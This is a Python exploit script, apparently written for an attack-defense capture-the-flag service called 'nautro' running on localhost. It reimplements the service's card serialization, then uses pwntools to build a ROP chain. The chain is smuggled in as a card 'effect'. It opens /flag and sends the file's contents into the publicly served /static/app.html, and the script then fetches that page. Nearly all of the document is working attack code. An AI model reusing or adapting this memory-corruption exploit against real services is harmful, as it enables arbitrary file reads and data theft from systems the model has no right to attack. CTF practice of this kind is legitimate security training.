import requests
import sys
import base64

SERVICE_NAME = "nautro"

host = 'localhost'

if host == 'localhost':
    port = 8080

url = f"http://{host}:{port}"
print('Target host', url)

from dataclasses import dataclass
from enum import IntEnum

def encode(number: int) -> bytes:
    if number == 0:
        return b'\x00'
    byte_list = []
    while number > 0:
        byte = number & 0x3F 
        number >>= 6
        if number > 0:
            byte |= 0x40
        byte_list.append(byte)
    return bytes(byte_list)

def decode(data: bytes) -> tuple[int, bytes]:
    result = 0
    shift = 0
    bytes_consumed = 0
    for byte in data:
        bytes_consumed += 1
        payload = byte & 0x3F
        result |= payload << shift
        shift += 6
        if (byte & 0x40) == 0:
            break
    return result, data[bytes_consumed:]

class ResourceType(IntEnum):
    none         = 0x0
    water        = 0x1
    food         = 0x2
    stone        = 0x3
    tool         = 0x4
    knowledge    = 0x5
    copper       = 0x6
    tin          = 0x7
    bronze       = 0x8
    iron         = 0x9
    gold         = 0xA
    concrete     = 0xB
    skill        = 0xC
    mechanical   = 0xD
    steel        = 0xE
    navigation   = 0xF
    gunpowder    = 0x10
    printing     = 0x11
    ships        = 0x12
    exotic_goods = 0x13
    culture      = 0x14
    coal         = 0x15
    steam        = 0x16
    transport    = 0x17
    electricity  = 0x18
    chemistry    = 0x19
    oil          = 0x1A
    plastics     = 0x1B
    uranium      = 0x1C
    electronics  = 0x1D
    computers    = 0x1E
    rockets      = 0x1F
    advanced_materials = 0x20
    energy       = 0x21
    bandwidth    = 0x22
    personalization = 0x23
    ai_cores     = 0x24
    nanotech     = 0x25
    fusion       = 0x26
    undefined    = 0x27

@dataclass
class Card:
    uuid: int
    name: str
    description: str
    image: str
    requires: tuple[ResourceType, int]
    produces: tuple[ResourceType, int]
    activations: int # 0 == inf
    effect: bytes | None = None

    @staticmethod
    def serialize_int(value: int) -> bytes:
        return b"U" + encode(value)
    
    @staticmethod
    def serialize_bytes(value: bytes) -> bytes:
        return b"S" + Card.serialize_int(len(value)) + value
    
    def serialize(self) -> bytes:
        res = b""
        res += b"0" + Card.serialize_int(self.uuid)
        res += b"1" + Card.serialize_bytes(self.name.encode('utf-8'))
        res += b"2" + Card.serialize_bytes(self.description.encode('utf-8'))
        res += b"3" + Card.serialize_bytes(self.image.encode('utf-8'))
        res += b"4" + Card.serialize_int(self.requires[0]) + Card.serialize_int(self.requires[1])
        res += b"5" + Card.serialize_int(self.produces[0]) + Card.serialize_int(self.produces[1])
        res += b"6" + Card.serialize_int(self.activations)
        if self.effect:
            res += b"7" + Card.serialize_bytes(self.effect)
        return res
    
    @staticmethod
    def parse_int(data: bytes) -> tuple[int, bytes]:
        assert data[0:1] == b"U"
        return decode(data[1:])
   
    @staticmethod
    def parse_bytes(data: bytes) -> tuple[bytes, bytes]:
        assert data[0:1] == b"S"
        l, data = Card.parse_int(data[1:])
        return data[:l], data[l:]
        
    @staticmethod
    def parse(data: bytes) -> 'Card':
        """
        Parses a byte string to create a Card object.
        """
        # A dictionary to hold the arguments for the Card constructor
        kwargs = {}

        # Field 0: uuid
        assert data[0:1] == b'0', "Data must start with field '0'"
        uuid, data = Card.parse_int(data[1:])
        kwargs['uuid'] = uuid

        # Field 1: name
        assert data[0:1] == b'1', "Expected field '1' (name)"
        name_bytes, data = Card.parse_bytes(data[1:])
        kwargs['name'] = name_bytes.decode('utf-8')

        # Field 2: description
        assert data[0:1] == b'2', "Expected field '2' (description)"
        desc_bytes, data = Card.parse_bytes(data[1:])
        kwargs['description'] = desc_bytes.decode('utf-8')

        # Field 3: image
        assert data[0:1] == b'3', "Expected field '3' (image)"
        image_bytes, data = Card.parse_bytes(data[1:])
        kwargs['image'] = image_bytes.decode('utf-8')

        # Field 4: requires
        assert data[0:1] == b'4', "Expected field '4' (requires)"
        req_type_val, data = Card.parse_int(data[1:])
        req_amount, data = Card.parse_int(data) # data now starts with the next 'U' prefix
        kwargs['requires'] = (ResourceType(req_type_val), req_amount)

        # Field 5: produces
        assert data[0:1] == b'5', "Expected field '5' (produces)"
        prod_type_val, data = Card.parse_int(data[1:])
        prod_amount, data = Card.parse_int(data)
        kwargs['produces'] = (ResourceType(prod_type_val), prod_amount)

        # Field 6: activations
        assert data[0:1] == b'6', "Expected field '6' (activations)"
        activations, data = Card.parse_int(data[1:])
        kwargs['activations'] = activations
        
        # Set default for optional field
        kwargs['effect'] = None

        # Field 7: effect (optional)
        if data and data[0:1] == b'7':
            effect_bytes, data = Card.parse_bytes(data[1:])
            kwargs['effect'] = effect_bytes
        
        # Instantiate and return the Card object
        return Card(**kwargs)

def new_game():
    res = s.post(f"{url}/new_game/", data={"sandbox": 1})
    uuid =  res.json()['uuid']
    s.post(f"{url}/continue")
    return uuid

def play_cards(session_id, card_ids = []):
    res = s.post(f"{url}/play_cards", headers = {'session-id': str(session_id)}, json={"card_ids": card_ids})
    out = res.json()
    print(res.text)
    return out

def game_state(session_id):
    res = s.get(f"{url}/game_state", headers = {'session-id': str(session_id)})
    out = res.json()
    print(out)
    return out

def update_deck(session_id, deck):
    res = s.post(f"{url}/update_deck", headers = {'session-id': str(session_id)}, json={"card_ids": deck})
    print(res.text)
    # assert out['success'] == True, "Failed to update deck: " + out
    return 0

def load_card(session_id, card):
    res = s.post(f"{url}/load_card", headers = {'session-id': str(session_id)}, data=base64.b64encode(card) + b"|")
    print(res.text)
    assert 'success' in res.text, "Failed to load card: " + res.text

def sb_load_card(session_id, card):
    print(len(card))
    res = s.post(f"{url}/sb/load_card", headers = {'session-id': str(session_id)}, data=base64.b64encode(card) + b"|")
    print("aaaaaaa: ", res.text)
    assert 'success' in res.text, "Failed to load card: " + res.text

def sb_new_game():
    res = s.post(f"{url}/sb/new_game/0")
    print(res.text)
    uuid =  res.json()['uuid']
    # s.post(f"{url}/continue")
    return uuid

    
#
# Se avete domande sulla ROP ping @prosti
#
from pwn import ELF, ROP, context, flat, constants, u64
from time import sleep

def sub_sp(n):
    return  b'uU' + encode(n)

def push_imm(n):
    return b'iU' + encode(n)

def gencode(chain: bytes, sp: int):
    code = b""
    code += sub_sp(0x10000 - (sp + (len(chain) // 8) + 1))

    for idx in reversed(range(0, len(chain), 8)):
        code += sub_sp(2) + push_imm(u64(chain[idx:idx+8]))
     
    return code

def rop_effect():
    exe = ELF("./main")
    
    context.terminal = ['kitty']
    context.arch = 'amd64'
    context.os = 'linux'

    # 0x000000000119e2da: pop rsi; pop rbp; ret; 
    # 0x000000000119bbfa: pop rdi; pop rbp; ret; 
    # 0x000000000119d6e6: pop rax; pop rbx; pop r14; pop r15; pop rbp; ret; 
    # 0x00000000011d1a71: pop rdx; adc byte ptr [rax + 0x39], cl; ret;
    # 0x00000000011a04b1: mov r10d, 0xe3; syscall; 
    
    target_sp = 0x10b
    
    rop = ROP(exe)
    rop.rdi = next(exe.search("/flag"))
    rop.rsi = 2 # O_RDONLY
    rop.rax = 0x00000000011ece00
    rop.raw(0x00000000011d1a71)
    rop.raw(0)
    rop.rax = 2 # open
    rop.raw(rop.find_gadget(['syscall', 'pop rbp', 'ret'])[0])
    rop.raw(0)

    rop.rdi = next(exe.search("/static/app.html"))+1
    rop.rsi = 2 # O_WRONLY
    rop.rax = 0x00000000011ece00 # rdx = 0
    rop.raw(0x00000000011d1a71)
    rop.raw(0)
    rop.rax = 2 # open
    rop.raw(rop.find_gadget(['syscall', 'pop rbp', 'ret'])[0])
    rop.raw(0)

    rop.rdi = 7 # app.html fd
    rop.rsi = 6 # /flag fd 
    rop.rax = 0x00000000011ece00 # rdx = 0
    rop.raw(0x00000000011d1a71)
    rop.raw(0)
    rop.rax = 40 # sendfile
    rop.raw(0x00000000011a04b1)
    
    print(rop.dump())
    
    code = gencode(rop.chain(), target_sp)
    print(code)

    return code

if __name__ == "__main__":
    with requests.Session() as s:
        session_id = sb_new_game()

        mycard = Card(
            uuid=197,
            name="aaaaaaa",
            description="aaaaaaapo",
            image="💥",
            requires=(ResourceType.food, 1),
            produces=(ResourceType.energy, 2),
            activations=0,
            effect=rop_effect()
        )
        
        sb_load_card(session_id, mycard.serialize())

        try:
            res = play_cards(session_id, [197])
        except:
            ...
        
    sleep(2)
    print(requests.get(f"{url}/static/app.html", headers={"session-id": str(session_id)}).text)